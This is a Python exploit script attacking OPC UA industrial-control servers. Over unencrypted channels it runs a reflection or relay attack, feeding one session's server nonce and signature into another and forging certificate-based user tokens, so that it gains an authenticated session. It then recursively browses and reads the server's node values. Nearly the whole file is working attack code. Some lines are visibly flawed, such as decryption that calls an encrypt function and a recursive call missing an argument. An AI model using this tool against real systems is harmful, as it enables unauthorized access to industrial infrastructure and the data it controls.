from messages import *
from message_fields import *
from typing import *
from crypto import *
from datetime import datetime
from socket import socket, create_connection

import sys, os, itertools, re

# Logging and errors.
def log(msg : str):
  print(f'[*] {msg}', file=sys.stderr)
  
def log_success(msg : str):
  print(f'[+] {msg}')

# Thrown when an attack was not possible due to a configuration that is not vulnerable to it (other exceptions indicate 
# unexpected errors, which can have all kinds of causes). 
class AttackNotPossible(Exception):
  pass
  
def parse_endpoint_url(url):
  m = re.match(r'opc\.tcp://(?P<host>[^:/]+):(?P<port>\d+)/', url)
  if not m:
    raise Exception(f'Don\'t know how to process endpoint url: {url}')
  else:
    return m.group('host', 'port')

# Common routines.

# Send an OPC request message and receive a response.
def opc_exchange(sock : socket, request : OpcMessage, response_obj : Optional[OpcMessage] = None) -> OpcMessage:
  with sock.makefile('rwb') as sockio:
    sockio.write(request.to_bytes())
    sockio.flush()
    response = response_obj or request.__class__()
    response.from_bytes(sockio)
    return response
  
# Sets up the connection, does a plain hello and simply ignores the server's size and chunking wishes.
def connect_and_hello(host : str, port : int) -> socket:
  sock = create_connection((host,port))
  opc_exchange(sock, HelloMessage(
    version=0,
    receiveBufferSize=2**16,
    sendBufferSize=2**16,
    maxMessageSize=2**24,
    maxChunkCount=2**8,
    endpointUrl=f'opc.tcp://{host}:{port}/',
  ), AckMessage())
  return sock

def simple_requestheader(authToken : NodeId = NodeId(0,0)) -> requestHeader.Type:
  return requestHeader.create(
    authenticationToken=authToken,
    timeStamp=datetime.now(),
    requestHandle=0,
    returnDiagnostics=0,
    auditEntryId=None,
    timeoutHint=0,
    additionalHeader=None,
  )

@dataclass
class ChannelState:
  sock : socket
  channel_id: int
  token_id : int
  msg_counter : int
  crypto: Optional[SessionCrypto]

# Attempt to start a "Secure" channel with no signing or encryption.
def unencrypted_opn(sock: socket) -> ChannelState:
  reply = opc_exchange(sock, OpenSecureChannelMessage(
    secureChannelId=0,
    securityPolicyUri=SecurityPolicy.NONE,
    senderCertificate=None,
    receiverCertificateThumbprint=None,
    sequenceNumber=1,
    requestId=1,
    encryptedMessage=openSecureChannelRequest.to_bytes(openSecureChannelRequest.create(
      requestHeader=simple_requestheader(),
      clientProtocolVersion=0,
      requestType=SecurityTokenRequestType.ISSUE,
      securityMode=MessageSecurityMode.NONE,
      clientNonce=None,
      requestedLifetime=3600000,
    ))
  ))
  
  resp, _ = openSecureChannelResponse.from_bytes(reply.encryptedMessage)
  return ChannelState(
    sock=sock,
    channel_id=resp.securityToken.channelId,
    token_id=resp.securityToken.tokenId,
    msg_counter=2,
    crypto=None,
  )


# Exchange a conversation message, once the channel has been established by the OPN exchange.
def session_exchange(channel : ChannelState, 
                     reqfield : EncodableObjectField, respfield : EncodableObjectField, 
                     **req_data) -> NamedTuple:
  msg = ConversationMessage(
    secureChannelId=channel.channel_id,
    tokenId=channel.token_id,
    encodedPart=encodedConversation.to_bytes(encodedConversation.create(
      sequenceNumber=channel.msg_counter,
      requestId=channel.msg_counter,
      requestOrResponse=reqfield.to_bytes(reqfield.create(**req_data)),
    ))
  )
  
  crypto = channel.crypto
  if crypto:
    # Add padding and signing into encoded message.
    msgbytes = msg.to_bytes()
    padding = pkcs7_pad(msgbytes)[len(msgbytes):]
    mac = sha_hmac(crypto.policy, crypto.clientKeys.signingKey, msgbytes + padding)
    plaintext = msg.encodedPart + padding + mac
    
    # Encrypt encoded part.
    msg.encodedPart = aes_cbc_encrypt(crypto.clientKeys.encryptionKey, crypto.clientKeys.iv, plaintext)
    
  # Do the exchange.
  reply = opc_exchange(channel.sock, msg)
  
  if crypto:
    # Decrypt.
    plaintext = aes_cbc_encrypt(crypto.serverKeys.encryptionKey, crypto.serverKeys.iv, reply.encodedPart)
    
    # Remove signature and padding. Don't bother to validate.
    decodedPart = pkcs7_unpad(plaintext[:macsize(crypto.policy)])
  else:
    decodedPart = reply.encodedPart
    
  # Increment the message counter.
  channel.msg_counter += 1
    
  # Parse the response.
  convo, _ = encodedConversation.from_bytes(decodedPart)
  resp, _ = respfield.from_bytes(convo.requestOrResponse)
  return resp
  

# Relevant endpoint information.
@dataclass
class EndpointInfo:
  host             : str
  port             : int
  certificate      : bytes
  policy           : SecurityPolicy
  mode             : MessageSecurityMode
  accepts_certauth : bool

# Request endpoint information from a server.
def get_endpoints(host : str, port: int) -> List[EndpointInfo]:
  with connect_and_hello(host, port) as sock:
    chan = unencrypted_opn(sock)
    resp = session_exchange(chan, getEndpointsRequest, getEndpointsResponse, 
      requestHeader=simple_requestheader(),
      endpointUrl=f'opc.tcp://{host}:{port}',
      localeIds=[],
      profileUris=[],
    )
      
  # Only return endpoints that use the binary protocol.
  return [ep for ep in resp.endpoints if ep.transportProfileUri.endswith('uabinary')]


def execute_relay_attack(
    imp_chan : ChannelState, imp_endpoint : endpointDescription.Type,
    login_chan : ChannelState, login_endpoint : endpointDescription.Type
  ) -> NodeId:
    def csr(chan, client_ep, server_ep, nonce):
      return session_exchange(chan, createSessionRequest, createSessionResponse, 
        requestHeader=simple_requestheader(),
        clientDescription=client_ep.server,
        serverUri=server_ep.server.applicationUri,
        endpointUrl=server_ep.endpointUrl,
        sessionName=None,
        clientNonce=nonce,
        clientCertificate=client_ep.serverCertificate,
        requestedSessionTimeout=600000,
        maxResponseMessageSize=2**24,
      )

    # Send CSR to login_endpoint, pretending we're imp_endpoint. Use arbitrary nonce.
    createresp1 = csr(login_chan, imp_endpoint, login_endpoint, os.urandom(32))
    
    # Now send the server nonce of this channel as a client nonce on the other channel.
    createresp2 = csr(imp_chan, login_endpoint, imp_endpoint, createresp1.serverNonce)
    
    # Make a token with an anonymous or certificate-based user identity policy.
    anon_policies = [p for p in login_endpoint.userIdentityTokens if p.tokenType == UserTokenType.ANONYMOUS]
    cert_policies = [p for p in login_endpoint.userIdentityTokens if p.tokenType == UserTokenType.CERTIFICATE]
    if anon_policies:
      usertoken = anonymousIdentityToken.create(policyId=anon_policies[0].policyId)
      usersig = signatureData.create(algorithm=None,signature=None)
    elif cert_policies:
      log('User certificate required. Reusing the server certificate to forge user token.')
      usertoken = x509IdentityToken.create(
        policyId=cert_policies[0].policyId, 
        certificateData=imp_endpoint.serverCertificate
      )
      
      # Simply reuse the clientSignature, since we're using the same cert and nonce for that.
      usersig = createresp2.serverSignature
    else:
      raise AttackNotPossible('Endpoint does not allow either anonymous or certificate-based authentication.')
    
    if createresp2.serverSignature.signature is None:
      log('Server did not sign the CreateSessionResponse. Is unauthenticated access allowed? In this case no reflection attack is needed.')
    
    # Now activate the first session using the signature from the second session.
    session_exchange(login_chan, activateSessionRequest, activateSessionResponse, 
      requestHeader=simple_requestheader(createresp1.authenticationToken),
      clientSignature=createresp2.serverSignature,
      clientSoftwareCertificates=[],
      localeIds=[],
      userIdentityToken=usertoken,
      userTokenSignature=usersig,
    )
    
    # Return auth token if succesful.
    return createresp1.authenticationToken

# Demonstrate access by recursively browsing nodes. Variables are read.
# Based on https://reference.opcfoundation.org/Core/Part4/v104/docs/5.8.2
def demonstrate_access(chan : ChannelState, authToken : NodeId):
  max_children = 100
  recursive_nodeclasses = {NodeClass.OBJECT}
  read_nodeclasses = {NodeClass.VARIABLE}
  
  print(repr(viewDescription.default_value))
  def browse_from(root, depth):
    bresp = session_exchange(chan, browseRequest, browseResponse,
      requestHeader=simple_requestheader(authToken),
      view=viewDescription.default_value,
      requestedMaxReferencesPerNode=max_children,
      nodesToBrowse=[browseDescription.create(
        nodeId=root,
        browseDirection=BrowseDirection.FORWARD,
        referenceTypeId=NodeId(0,0), #NodeId(0, 33),
        includeSubtypes=True,
        nodeClassMask=0x00, # All classes
        resultMask=0x3f,    # All results
      )],
    )
    
    tree_prefix = ' ' * (depth - 1) + '|'
    for result in bresp.results:
      for ref in result.references:
        if ref.nodeClass in recursive_nodeclasses:
          # Keep browsing recursively.
          log_success(tree_prefix + f'+ {ref.displayName.text} ({ref.nodeClass.name})')
          browse_from(ref.nodeId.nodeId)
        elif ref.nodeClass in read_nodeclasses:
          # Read current variable value. For the sake of simplicity do one at a time.
          try:
            readresp = session_exchange(chan, readRequest, readResponse,
              requestHeader=simple_requestheader(authToken),
              maxAge=0,
              timestampsToReturn=TimestampsToReturn.BOTH,
              nodesToRead=[readValueId.create(
                nodeId=ref.nodeId.nodeId,
                attributeId=0x0d, # Request value
                indexRange=None,
                dataEncoding=QualifiedNameField.default_value,
              )],
            )
            log_success(tree_prefix + f'- {ref.displayName.text}: "{readresp.value}"')
          except UnsupportedFieldException as ex:
            log_success(tree_prefix + f'- {ref.displayName.text}: <{ex.fieldname}>')
        else:
          log_success(tree_prefix + f'- {ref.displayName.text} ({ref.nodeClass.name})')
          
    if len(bresp.results) >= max_children:
      log_success(tree_prefix + '- ...')
    
  log('Trying to browse data via authenticated channel.')
  log('Tree: ')
  log_success('+ <root>')
  browse_from(NodeId(0, 84), 1)
  log('Finished browsing.')  
  

# Reflection attack: log in to a server with its own identity.
def reflect_attack(address : Tuple[str, int]):
  host, port = address
  log(f'Attempting reflection attack against opc.tcp://{host}:port/')
  endpoints = get_endpoints(host, port)
  log(f'Server advertises {len(endpoints)} endpoints.')
  
  # Try attack against first endpoint with a NONE policy.
  none_eps = [ep for ep in endpoints if ep.securityPolicyUri == SecurityPolicy.NONE]
  if none_eps:
    target = none_eps[0]
    thost, tport = parse_endpoint_url(target.endpointUrl)
    log(f'Targeting {thost}:{tport} with NONE security policy.')
    with connect_and_hello(thost, tport) as sock1, connect_and_hello(thost, tport) as sock2:
      mainchan, oraclechan = unencrypted_opn(sock1), unencrypted_opn(sock2)
      token = execute_relay_attack(oraclechan, target, mainchan, target)
      log_success(f'Attack succesfull! Authenticated session set up with {target.endpointUrl}.')
      demonstrate_access(mainchan, token)
  else:
    raise AttackNotPossible('TODO: implement combination with OPN attack.')
      
def relay_attack(source : Tuple[str, int], target : Tuple[str, int]):
  a2url = lambda addr: f'opc.tcp://{":".join(addr)}/'
  log(f'Attempting relay from {a2url(source)} to {a2url(target)}')
  seps = get_endpoints(*source)
  log(f'Listed {len(seps)} endpoints from {a2url(source)}.')
  teps = get_endpoints(*target)
  log(f'Listed {len(teps)} endpoints from {a2url(target)}.')
  
  for sep, tep in itertools.product(seps, teps):
    if sep.securityPolicyUri == tep.securityPolicyUri == SecurityPolicy.NONE:
      log(f'Trying endpoints {sep.endpointUrl} -> {tep.endpointUrl} (both NONE security policy)')
      shost, sport = parse_endpoint_url(sep.endpointUrl)
      thost, tport = parse_endpoint_url(tep.endpointUrl)
      with connect_and_hello(shost, sport) as ssock, connect_and_hello(thost, tport) as tsock:
        mainchan, oraclechan = unencrypted_opn(tsock), unencrypted_opn(ssock)
        token = execute_relay_attack(oraclechan, sep, mainchan, tep)
        log_success(f'Attack succesfull! Authenticated session set up with {tep.endpointUrl}.')
        demonstrate_access(mainchan, token)
        return
  
  raise AttackNotPossible('TODO: implement combination with OPN attack.')

